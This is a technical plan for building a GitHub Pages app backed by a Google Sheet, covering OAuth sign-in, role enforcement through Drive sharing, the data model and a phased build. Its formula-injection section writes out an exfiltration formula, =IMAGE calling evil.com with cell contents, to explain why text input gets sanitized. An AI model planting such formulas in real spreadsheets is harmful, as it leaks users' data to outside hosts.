# Tracker — SPA on GitHub Pages with a Google Sheet backend

**Status:** draft for review · **Working dir:** `/Users/ramynazmy/Documents/Scripts/tracker` (empty, not yet a git repo)

> Review this, then tell me to execute it. Implementation starts at Phase 0.

---

## 1. Context

You want a single-page app served from GitHub Pages that reads and writes records held in a Google
Sheet, with per-user access control. There is no server to run and nothing to pay for: **the Sheet is
the database, and Google's own identity + file-permission systems are the auth layer.**

Decisions already settled:

| Decision | Choice |
|---|---|
| Data flow | Browser → Google Sheets API v4 directly, using the signed-in user's own OAuth token |
| Sign-in | Google Identity Services (GIS) |
| Allowlist | `Users` tab inside the same Sheet |
| Roles | `admin` / `editor` / `viewer` |
| Role enforcement | Drive share level + Sheets Protected Ranges (**Google** enforces); `Users` tab drives the UI |
| Record shape | Generic — one schema config file defines columns, types, validation |
| Stack | Vite + React + TypeScript, deployed by GitHub Actions |

---

## 2. The one thing to understand before reading further

Because the browser calls the Sheets API **directly with the user's own token**, the React app is
*not* a security boundary. A user can bypass it entirely:

```
     What you might assume                    What is actually true
     ─────────────────────                    ─────────────────────

   ┌──────────┐                            ┌──────────┐
   │   User   │                            │   User   │
   └────┬─────┘                            └────┬─────┘
        │                                       │
        ▼                                       ├──────────────┬──────────────┐
   ┌──────────┐                                 ▼              ▼              ▼
   │ Your app │ ← rules live here        ┌──────────┐   ┌───────────┐  ┌───────────┐
   └────┬─────┘                          │ Your app │   │  sheets.  │  │  Google   │
        │                                │          │   │  google   │  │  Sheets   │
        ▼                                │          │   │  .com/v4  │  │   (UI)    │
   ┌──────────┐                          └────┬─────┘   └─────┬─────┘  └─────┬─────┘
   │  Sheet   │                               └───────────────┴──────────────┘
   └──────────┘                                               │
                                                              ▼
                                                        ┌──────────┐
                                                        │  Sheet   │ ← rules must live HERE
                                                        └──────────┘
```

Hiding a "Delete" button stops nobody. So roles are enforced **at the Google layer**:

- a `viewer` is shared as Drive **Viewer** → Google rejects every write they attempt, from anywhere;
- the `Users` and `Audit` tabs are **protected ranges** → an `editor` cannot promote themselves.

The `Users` tab exists so the UI renders correctly and so you have one place to manage people. It is
convenience, not enforcement.

> ⚠️ **The single mistake that voids this whole design:** sharing the Sheet as *Editor* with
> everyone and relying on the `role` column. Then the role column is decoration.

---

## 3. Architecture

```
╔═══════════════════════════════════════════════════════════════════════╗
║  GITHUB PAGES — static files, world-readable, no secrets              ║
║  https://<user>.github.io/tracker/                                    ║
║                                                                       ║
║   ┌─────────────────────────────────────────────────────────────┐    ║
║   │  React SPA (Vite build)                                     │    ║
║   │                                                             │    ║
║   │   auth/          GIS → ID token (who) + access token (what) │    ║
║   │   sheets/        fetch wrapper: bearer, retry, 401→refresh  │    ║
║   │   config/schema  field definitions → forms + validation     │    ║
║   │   components/    table, form, sign-in, access-denied        │    ║
║   └─────────────────────────────────────────────────────────────┘    ║
╚═══════════════════════════════╤═══════════════════════════════════════╝
                                │
                                │  HTTPS
                                │  Authorization: Bearer <the USER's access token>
                                ▼
                ┌───────────────────────────────────┐
                │   sheets.googleapis.com  /v4      │
                │                                   │
                │   ★ THE PERMISSION CHECK HAPPENS  │
                │     HERE, PERFORMED BY GOOGLE     │
                └────────────────┬──────────────────┘
                                 │
                                 ▼
╔═══════════════════════════════════════════════════════════════════════╗
║  SPREADSHEET  —  general access: RESTRICTED (never "anyone with link") ║
║                                                                       ║
║   ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐                ║
║   │ Records  │ │  Users   │ │  Audit   │ │   Meta   │                ║
║   │ the data │ │ email    │ │ append-  │ │ schema   │                ║
║   │          │ │ role     │ │ only log │ │ version  │                ║
║   │          │ │ active   │ │          │ │          │                ║
║   └──────────┘ └────┬─────┘ └────┬─────┘ └──────────┘                ║
║                     │            │                                    ║
║                     └──── 🔒 protected: admins only ────┘             ║
║                                                                       ║
║   Shared individually:  admin/editor → Editor    viewer → Viewer      ║
╚═══════════════════════════════════════════════════════════════════════╝
```

### Three independent gates

This is what makes a serverless design defensible. A user must pass **all three**:

```
  ┌────────────────────────────────────────────────────────────────────────┐
  │                                                                        │
  │   GATE 1              GATE 2                    GATE 3                 │
  │   Google Cloud        Drive sharing             Users tab              │
  │   test-user list      on the spreadsheet        active = TRUE          │
  │                                                                        │
  │   ┌─────────┐         ┌─────────┐               ┌─────────┐            │
  │   │ Can you │  ──▶    │ Can you │      ──▶      │ Should  │   ──▶  ✅  │
  │   │ sign in │         │ read /  │               │ the app │            │
  │   │ at all? │         │ write?  │               │ show you│            │
  │   └────┬────┘         └────┬────┘               │ things? │            │
  │        │                   │                    └────┬────┘            │
  │        ✗                   ✗                         ✗                 │
  │        ▼                   ▼                         ▼                 │
  │   consent screen      403 from API              AccessDenied           │
  │   blocks them         → AccessDenied            screen                 │
  │                                                                        │
  │   ENFORCED BY         ENFORCED BY               ENFORCED BY            │
  │   Google              Google  ★ the real one    your app (cosmetic)    │
  └────────────────────────────────────────────────────────────────────────┘
```

Gate 2 is the one that actually protects data. Gates 1 and 3 are administrative convenience.

### Why the OAuth app stays in "Testing" status

`https://www.googleapis.com/auth/spreadsheets` is a **sensitive scope**. Publishing the consent
screen to *In production* with a sensitive scope triggers Google app verification — a review taking
days-to-weeks that wants a homepage, a privacy policy, and a demo video. Staying in *Testing* skips
all of it.

```
   Consent screen = Internal            Consent screen = External / Testing
   (needs a Workspace domain)           (any Gmail account)
   ────────────────────────────         ─────────────────────────────────────
   ✅ no warning screen                  ⚠️  "Google hasn't verified this app"
   ✅ no user cap                            → Advanced → Go to Tracker (unsafe)
   ✅ no verification                         (first sign-in only)
   ❌ your domain only                   ⚠️  hard cap: 100 test users
                                        ✅ no verification
                        ↑ PREFER THIS IF YOU HAVE IT
```

Document the warning screen in the README with a screenshot, or your users will think the app is
broken.

---

## 4. Data model

### `Records` tab

Row 1 is the header row and is the contract between Sheet and app. Housekeeping columns exist
regardless of what domain columns you configure:

| Column | Purpose |
|---|---|
| `id` | UUID from `crypto.randomUUID()`, set by the client on create. **Row numbers are never identity** — they shift the moment anyone sorts or inserts in the Sheet. |
| `createdAt` / `createdBy` | ISO-8601 UTC + creator's email |
| `updatedAt` / `updatedBy` | Same for last write. `updatedAt` doubles as the optimistic-concurrency token. |
| `deleted` | `TRUE`/`FALSE`. **Soft delete** — the app filters these out. Keeps history and avoids fragile `deleteDimension` calls. |
| …domain columns… | Defined in `src/config/schema.ts` |

### `Users` tab

```
   A            B         C              D         E
   email        role      displayName    active    notes
   ─────────────────────────────────────────────────────────────
   you@x.com    admin     Ramy           TRUE
   a@x.com      editor    Alice          TRUE
   b@x.com      viewer    Bob            TRUE      read-only
   c@x.com      editor    Carol          FALSE     left the team
```

Matched on the lowercased email from the **verified ID token** (not user input).

### `Audit` tab

Append-only: `timestamp` │ `actorEmail` │ `action` │ `recordId` │ `summary`.
Best-effort — a failed audit append logs a warning and never blocks the user's write.

### Schema config lives in the repo, not the Sheet

Keeping it in TypeScript means it's versioned with the code, typed end-to-end, and checked at build
time rather than discovered at runtime.

```ts
// src/config/schema.ts
export const schema = {
  sheetName: 'Records',
  fields: [
    { key: 'title',  label: 'Title',  type: 'text',   required: true, maxLength: 200 },
    { key: 'status', label: 'Status', type: 'select', options: ['open','doing','done'] },
    { key: 'amount', label: 'Amount', type: 'number', min: 0 },
    { key: 'due',    label: 'Due',    type: 'date' },
    { key: 'owner',  label: 'Owner',  type: 'email' },
    { key: 'notes',  label: 'Notes',  type: 'longtext' },
  ],
  listColumns: ['title','status','owner','due'],
  sortDefault: { key: 'updatedAt', dir: 'desc' },
} as const
```

One field definition drives three things:

```
                    ┌──────────────────┐
                    │  field: 'status' │
                    │  type: 'select'  │
                    │  options: [...]  │
                    └────────┬─────────┘
             ┌───────────────┼───────────────┐
             ▼               ▼               ▼
     ┌──────────────┐ ┌─────────────┐ ┌──────────────┐
     │ FieldInput   │ │ validate.ts │ │ RecordTable  │
     │ renders a    │ │ rejects any │ │ formats the  │
     │ <select>     │ │ other value │ │ cell + badge │
     └──────────────┘ └─────────────┘ └──────────────┘
```

Adding a field = one line here + one header cell in the Sheet.

---

## 5. Repository layout

```
tracker/
├─ .github/workflows/deploy.yml    GitHub Actions → Pages
├─ src/
│  ├─ main.tsx  App.tsx
│  ├─ config/
│  │  ├─ schema.ts                 field definitions (above)
│  │  └─ env.ts                    reads VITE_*, fails loudly at startup if missing
│  ├─ auth/
│  │  ├─ GoogleAuthProvider.tsx    GIS init, token lifecycle, React context
│  │  ├─ useAuth.ts                { user, role, status, signIn, signOut }
│  │  └─ tokenClient.ts            access-token request + silent refresh
│  ├─ sheets/                      ◀── the ONLY module that knows about Sheets.
│  │  ├─ client.ts                    If you ever migrate to an Apps Script
│  │  ├─ records.ts                   gateway, this folder is all that changes.
│  │  ├─ users.ts
│  │  ├─ audit.ts
│  │  └─ rows.ts                   A1 ranges, header↔object mapping, lookup by id
│  ├─ components/
│  │  ├─ RecordTable.tsx  RecordForm.tsx  FieldInput.tsx
│  │  └─ SignInScreen.tsx  AccessDenied.tsx  ErrorBoundary.tsx
│  ├─ hooks/useRecords.ts          load/mutate + cache + optimistic UI
│  └─ lib/validate.ts              schema-driven validation
├─ .env.example
├─ plan.md                         ← this file
└─ README.md                       setup + user-management runbook
```

**Routing — use `HashRouter`.** GitHub Pages 404s on deep SPA paths. The common workaround (copying
`index.html` to `404.html`) is a hack with back-button edge cases. Hash routes
(`/tracker/#/records/123`) simply work.

**Vite base** — `base: '/tracker/'` in `vite.config.ts`, or `'/'` for a custom domain or a
`<user>.github.io` repo.

---

## 6. Configuration and secrets

Nothing here is secret, and that is the point:

| Value | Where | Secret? |
|---|---|---|
| `VITE_GOOGLE_CLIENT_ID` | committed in `.env.production` | **No.** OAuth client IDs are public by design; the GIS token flow uses no client secret. |
| `VITE_SPREADSHEET_ID` | committed | **No.** Knowing the ID grants nothing — Drive sharing is the gate. |

> 🚫 **Never** commit a service-account key, a write-scoped API key, or a client secret. If the repo
> is public they're world-readable; if it's private they *still* ship inside the JS bundle that
> Pages serves publicly. **There is no safe way to hold a secret in a static SPA.**

**Token storage:**

```
   access token   →  in memory only (module var / React state)   ⏱ ~1h, re-acquired silently
   ID token       →  verified once, then discarded
   profile        →  sessionStorage (email, name, picture) for a smoother reload
   ─────────────────────────────────────────────────────────────────────────────
   localStorage   →  NOTHING. Survives tab close and is the prime XSS target.
```

---

## 7. Key flows

### Sign-in

```
  User          SPA              GIS            Google APIs          Sheet
   │             │                │                   │                │
   │──click──▶   │                │                   │                │
   │             │──requestAccessToken()──────▶       │                │
   │             │   scope: email profile spreadsheets│                │
   │  ◀────── Google account chooser + consent ──────  │                │
   │──approve──▶ │                │                   │                │
   │             │  ◀── access token (~1h, memory) ─  │                │
   │             │                │                   │                │
   │             │──GET /oauth2/v3/userinfo ────────▶ │                │
   │             │  ◀── verified email ─────────────  │                │
   │             │                │                   │                │
   │             │──batchGet: Users + Records ──────▶ │                │
   │             │                │                   │──permission──▶ │
   │             │                │                   │   check        │
   │             │  ◀───────────── 200 / 403 ──────── │                │
   │             │                                                     │
   │             ├─ 403 ................................▶ AccessDenied │
   │             ├─ no row in Users ....................▶ AccessDenied │
   │             ├─ active = FALSE .....................▶ AccessDenied │
   │             └─ row found ─▶ set role ─▶ render app                │
```

### Token expiry (Phase 2's hardest bit — get it right early)

```
    any Sheets call
         │
         ▼
    ┌─────────┐   200    ┌──────────┐
    │ fetch() ├─────────▶│  done    │
    └────┬────┘          └──────────┘
         │ 401 (token expired)
         ▼
    ┌──────────────────────────────┐
    │ requestAccessToken({prompt:''})│   ← silent, no UI, no user interaction
    └────┬───────────────────┬─────┘
         │ ok                │ fails
         ▼                   ▼
    retry once          SignInScreen
         │
         ▼
    ┌─────────┐
    │  done   │      All of this lives inside sheets/client.ts.
    └─────────┘      No caller ever thinks about tokens.
```

### Write with conflict detection

```
   User edits record ──▶ form holds updatedAt = T1
                              │
                              ▼
                    ┌──────────────────────┐
                    │ re-read id column    │  ← never trust a cached row index;
                    │ → find CURRENT row n │    a sort in the Sheet invalidates it
                    └──────────┬───────────┘
                               ▼
                    ┌──────────────────────┐
                    │ sheet updatedAt = T2 │
                    └──────────┬───────────┘
                               │
               T1 == T2 ───────┴─────── T1 != T2
                   │                        │
                   ▼                        ▼
         PUT Records!A{n}:Z{n}    ┌─────────────────────────┐
         set updatedAt = now      │ "This record changed    │
                   │              │  since you opened it"   │
                   ▼              │  [ Reload ] [Overwrite] │
         append to Audit          └─────────────────────────┘
```

Cheap to build now; genuinely painful to retrofit later.

### Deploy

```
   git push main
        │
        ▼
   ┌──────────────────────────────────────────────────────┐
   │ .github/workflows/deploy.yml                         │
   │   checkout → setup-node → npm ci → npm run build     │
   │   → upload-pages-artifact → deploy-pages             │
   │   permissions: contents:read, pages:write, id-token:write │
   └──────────────────────────────────────────────────────┘
        │  ~2 min
        ▼
   https://<user>.github.io/tracker/   live
```

---

## 8. Phases

Each phase ends in something you can look at and sign off on. **Phases 0–2 carry all the risk** —
every surprise this architecture can throw at us surfaces there. Phases 3–6 are ordinary CRUD.

```
  P0 ──── P1 ──── P2 ─────────── P3 ──── P4 ──── P5 ──── P6
  Google  Deploy  Auth +         Read    Write   Roles   Polish
  setup   pipeline access gate                   for real

  ╰──────── risky ────────╯      ╰──── routine ────╯   ╰─ ship ─╯
   manual   ~1h     ~half day     ~half day  ~day  ~half day
```

---

### Phase 0 — Google Cloud + Sheet setup · *manual, ~45 min, no code*

Must be done by you — it's tied to your Google account.

1. **Create the spreadsheet** with tabs `Records`, `Users`, `Audit`, `Meta`. Add header rows.
   Seed `Users` with your email as `admin`, `active = TRUE`. Copy the spreadsheet ID from the URL.
2. **Google Cloud project** → enable the **Google Sheets API**.
3. **OAuth consent screen** → *Internal* if you have a Workspace domain, else *External* left in
   **Testing**. Add scopes `email`, `profile`, and `.../auth/spreadsheets` (the first two are
   non-sensitive and don't change the verification bar). Add yourself **+ one test colleague** as
   test users — three of Phase 2's five acceptance tests need a second, non-admin account.
4. **OAuth Client ID** → type *Web application*.
   Authorized JavaScript origins: `http://localhost:5173` and `https://<user>.github.io`.
   (Origins are scheme+host+port only — no paths — so the `/tracker/` subpath needs no entry.)
   No redirect URIs are needed for the GIS token flow.
5. **Create the GitHub repo**; Pages source = *GitHub Actions*.
   ℹ️ Pages on a **private** repo requires GitHub Pro/Team/Enterprise. On a free account the repo
   must be public — fine here, since there are no secrets in it.

**Verify:** the Sheet opens; the client ID exists; `https://<user>.github.io/tracker/` resolves
(a 404 is expected until Phase 1).

---

### Phase 1 — Skeleton SPA + deploy pipeline

Prove deployment *before* writing anything real. Deploy problems are far cheaper to find now.

- `npm create vite@latest` → React + TS; set `base` in `vite.config.ts`.
- `HashRouter`, an app shell, one placeholder page.
- `src/config/env.ts` — read `VITE_*`, throw a readable startup error if any is missing.
- `.github/workflows/deploy.yml` as diagrammed above.

**Verify:** push to `main` → Action green → placeholder loads at the Pages URL. Hard-refresh on a
hash route still loads.
**Exit criteria:** a commit to `main` is live in ~2 minutes with zero manual steps.

---

### Phase 2 — Authentication and the access gate ★ highest risk

- Load `https://accounts.google.com/gsi/client`; init `google.accounts.oauth2.initTokenClient({
  client_id, scope: 'email profile https://www.googleapis.com/auth/spreadsheets' })`.
- **Sign-in — single token.** `requestAccessToken()` returns one access token covering both identity
  and Sheets; a single `GET https://www.googleapis.com/oauth2/v3/userinfo` with it yields the
  verified email used as the allowlist key. One consent screen, one token lifecycle. This avoids
  `google.accounts.id` / One Tap entirely, which is desirable — One Tap is entangled with FedCM and
  third-party-cookie changes that keep shifting.
- ⚠️ `requestAccessToken()` must be called from a **real user gesture** (a click). Fired from a
  mount effect, the popup is blocked and the app appears to hang. Only the silent
  `prompt: ''` refresh is exempt from this.
- **Silent refresh:** implement the 401 → `requestAccessToken({prompt:''})` → retry loop *inside*
  `sheets/client.ts` (see diagram in §7).
- **Allowlist check:** read `Users`, match on lowercased email → no row / `active = FALSE` →
  `AccessDenied` naming who to contact; else store `{ email, role, displayName }` in context.
- **Handle the API-level denial too:** a user not shared on the Sheet gets **403 on the `Users` read
  itself** — catch it and show the same friendly screen, not a stack trace.
- **Sign-out** clears memory + `sessionStorage` and calls `google.accounts.oauth2.revoke()`.

**Verify — all five must pass:**

| # | Test | Expected |
|---|---|---|
| 1 | Sign in as admin | app shell loads |
| 2 | Account that is a test user + shared on Sheet, but absent from `Users` | `AccessDenied` |
| 3 | Account not shared on the Sheet at all | `AccessDenied` via the 403 path, no crash |
| 4 | Leave tab idle > 1 hour, then act | silent refresh, **no visible re-login** |
| 5 | DevTools → Application → storage | **no access token anywhere** |

**Exit criteria:** all five green. Do not start Phase 3 until #4 works — expiry bugs are miserable
to retrofit once there's a UI on top.

---

### Phase 3 — Read path

- `sheets/rows.ts` — read `Records!A1:Z`; row 1 = headers; map header name → field key from
  `schema.ts`. Fail **specifically**: *"Sheet is missing column `status` — add it to row 1 of the
  Records tab"*, not "undefined is not a function".
- `sheets/records.ts → list()` — filter `deleted !== TRUE`, coerce values per field `type`.
  Read with `valueRenderOption=UNFORMATTED_VALUE` (clean numbers and booleans; `FORMATTED_VALUE`
  is locale-dependent and would need de-formatting).
- **Dates are stored as real date cells** (written `USER_ENTERED`), so the Sheet stays usable by
  hand — native date sorting, filters, conditional formatting and a date picker all keep working.
  The cost is that `UNFORMATTED_VALUE` returns them as **Google serial numbers** (days since
  1899-12-30). `rows.ts` owns a single serial↔ISO conversion pair, unit-tested, used on every read
  and write. Do not scatter this conversion — off-by-one and timezone bugs breed in duplicates.
- Read `Records!A:ZZ`, not `A1:Z` — the `Z` cap silently truncates past 26 columns and presents as
  "my new field isn't loading".
- `useRecords()` — load on mount, in-memory cache, manual refresh, `staleTime` so navigation
  doesn't refetch.
  ⚠️ **Quota:** 60 read requests per user per minute. Use `values:batchGet` to pull `Records` and
  `Users` in a single call.
- `RecordTable.tsx` — renders `schema.listColumns` with sort, text filter, and proper
  loading / empty / error states.

**Verify:** rows added by hand in the Sheet appear on refresh; a row with a malformed date or number
renders without breaking the table; removing the `status` header produces the specific error above.

---

### Phase 4 — Write path

| Operation | Call |
|---|---|
| Create | `POST /values/Records!A:A:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS` |
| Update | re-read `id` column → find current row `n` → `PUT /values/Records!A{n}:ZZ{n}` |
| Delete | set `deleted = TRUE` — **soft**, no `deleteDimension` |

`insertDataOption=INSERT_ROWS` is **not optional** — the default `OVERWRITE` will write over whatever
sits below a blank row (a totals row, a stray note). Silent data loss, hard to trace later.

- **Optimistic concurrency** per the §7 diagram. Be honest about the limit: Sheets has no
  transactions, so a sub-second check→write race remains. This narrows the window from minutes to
  milliseconds, which is the right amount of engineering for a small-team tracker. True
  serialization would need the Apps Script gateway in §10, which can hold a lock.
- 🔐 **Formula injection — sanitize text fields.** With `USER_ENTERED`, a value starting with `=`
  becomes a **live formula**. `=IMAGE("https://evil.com/?d="&A2)` makes the spreadsheet fetch that
  URL, leaking cell contents — a real exfiltration path via `IMAGE`/`IMPORTDATA`/`IMPORTRANGE`/
  `HYPERLINK`, not just a display bug. **Fix:** for text-typed fields, prefix values starting with
  `=`, `+`, `-` or `@` with a single apostrophe. Sheets then stores literal text, and the apostrophe
  is a display marker that does **not** come back on API read, so round-trips stay clean. Number and
  date fields are unaffected. We can't just switch to `RAW`, since `USER_ENTERED` is required for
  the real-date-cell decision in Phase 3.
- **Validation** — `lib/validate.ts` drives off `schema.ts` (required, type, min/max, options,
  maxLength); runs before every write, errors shown inline on the field.
- **Forms** — `RecordForm` + `FieldInput` switching on field `type`.
- **Audit** — append after each successful write, best-effort.
- **Optimistic UI** on mutation, with rollback on failure.

**Verify:** create → row appears in the Sheet with correct types + UUID; edit in-app → confirmed in
the Sheet; same record open in two tabs, save both → second gets the conflict prompt; delete hides
it in-app but the row survives with `deleted = TRUE`; an `Audit` row lands per action.

---

### Phase 5 — Roles, real enforcement, hardening

Where the access model stops being cosmetic. **Most of this work happens in the Sheet, not in code.**

#### Google-side (the actual enforcement)

| Role | Drive sharing | Protected ranges | Net effect |
|---|---|---|---|
| `admin` | Editor | listed as the only editor of protected ranges | full control |
| `editor` | Editor | blocked from the three protected ranges below | CRUD on records only |
| `viewer` | **Viewer** | n/a | Google rejects every write, from anywhere |

**Protect exactly three ranges** (*Data → Protect sheets and ranges*), admins only:

```
🔒 Users tab       ← without this, an editor sets their own role to admin
🔒 Audit tab       ← without this, an editor edits away their own trail
🔒 Records row 1   ← without this, a header rename breaks the Phase 3 mapping for everyone
```

- ⚠️ Choose **"Restrict who can edit this range"**, not "Show a warning when editing" — the warning
  is a speed bump anyone clicks through, not protection.
- ⚠️ **Tab-level protection only — do not protect columns inside `Records`.** Phase 4 updates write
  the whole row (`PUT A{n}:ZZ{n}`); if any cell in that range is protected against the editor,
  Google rejects the **entire** write and editors cannot save at all. Locking `id`/`createdBy` would
  force multi-sub-range writes: more calls per save, more failure modes. Accepted trade-off —
  editors can alter provenance columns by opening the Sheet directly.
  Row 1 is safe to protect because writes only ever touch row 2 onward and appends.
- Keep general access at **Restricted** — individual shares only, never "anyone with the link".
- **Drift is not detectable in-app.** The `Users` role and the Drive share can disagree (role
  `editor`, shared as Viewer → edit buttons that always 403). Reading Drive permissions would mean
  enabling the Drive API and another sensitive scope — not worth it. Handled by the runbook plus a
  clear *"Your access level changed — reload"* on 403, not by code.

#### App-side (UI mirrors the role)

```
   viewer  │ table + detail view only. No create/edit/delete affordances at all.
   editor  │ + full record CRUD.
   admin   │ + Users admin screen (add / deactivate / change role).
```

- Pre-flight guard: block `viewer` writes client-side with a clear message rather than letting
  Google return a raw 403.
- Handle 403-on-write everywhere — it's the expected signal that Drive sharing and the `Users` role
  have drifted apart. Surface it as *"Your access level changed — reload"*.

#### README runbook

```
   ADDING A USER — all three gates, in this order
   ───────────────────────────────────────────────────────────────
   1. Cloud console → OAuth consent screen → add as TEST USER
   2. Sheet → Share → Editor (admin/editor)  or  Viewer (viewer)
   3. Users tab → add row: email │ role │ name │ active = TRUE

   REMOVING A USER — reverse order
   ───────────────────────────────────────────────────────────────
   1. Users tab → active = FALSE
   2. Sheet → Share → remove them        ◀── this is the one that matters
   3. Cloud console → remove test user

   ⏱ Caveat: an already-issued access token stays valid up to ~1 hour
      after unsharing. Step 2 is what truly cuts them off, not step 1.
```

**Verify:** sign in as a `viewer` shared as Drive Viewer → no write UI, *and* a hand-crafted API
write from their browser console is rejected by Google with 403. Sign in as an `editor` → the
`Users` tab is not writable by them. Change your own role in the Sheet, reload, watch the UI change.

---

### Phase 6 — Polish

- `ErrorBoundary` + friendly global error screen; retry with backoff on 429/5xx from Sheets.
- Loading skeletons; offline detection (*"You're offline — showing cached data"*).
- Filters, search, saved views, CSV export.
- Keyboard shortcuts for create/save; mobile layout pass.
- README with setup screenshots — **including the unverified-app warning** users will hit.
- Dev parity: `.env.development` against the same Sheet, or a copy for safe testing.

---

## 9. End-to-end verification

Run after Phase 5, with two accounts:

| # | Step | Expected |
|---|---|---|
| 1 | Fresh incognito → Pages URL → sign in as admin | records list loads |
| 2 | Create a record → check the Sheet | row present, UUID + timestamps correct |
| 3 | Edit a row by hand in the Sheet → refresh app | change reflected |
| 4 | Two tabs, concurrent edit | conflict prompt on the second |
| 5 | Soft-delete | gone from app, `deleted = TRUE` in Sheet, audit row written |
| 6 | Second account as `viewer` | read-only UI; direct API write → 403 |
| 7 | Set that account `active = FALSE` → reload | `AccessDenied` |
| 8 | Idle 65 min → act | silent refresh, no re-login |
| 9 | DevTools → Application | no access token in any web storage |
| 10 | Push a trivial commit | Action deploys, change live |

---

## 10. Known limits and the escape hatch

| Limit | Detail | If you hit it |
|---|---|---|
| **100 users** | OAuth Testing-status cap | Migrate to an Apps Script gateway (below), or go through Google verification |
| **Sheet scale** | ~10M cells max; slow well before that | Past ~20k rows, archive to a second sheet or move to a real DB |
| **No offline writes** | Writes need connectivity; no queue-and-sync | Add a write queue in a later phase if it matters |
| **Users can see the raw Sheet** | Inherent to direct API access | Only the gateway design fixes this |

### The escape hatch, if the model outgrows itself

```
   TODAY                                  MIGRATION TARGET
   ─────                                  ────────────────
   Browser ──token──▶ Sheets API          Browser ──ID token──▶ Apps Script Web App
                          │                                          │ runs as YOU
                          ▼                                          ▼
                    Sheet (shared                              Sheet (PRIVATE —
                    with every user)                           shared with nobody)

   Users can open the Sheet.              Users have no Sheet access at all.
   Roles enforced by Drive.               Roles enforced server-side, per row.
   No user cap issue → 100.               No cap. No consent-screen warning.
```

The `src/sheets/` folder is deliberately the **only** module that knows the storage layer. That
migration would rewrite those five files and touch nothing else.



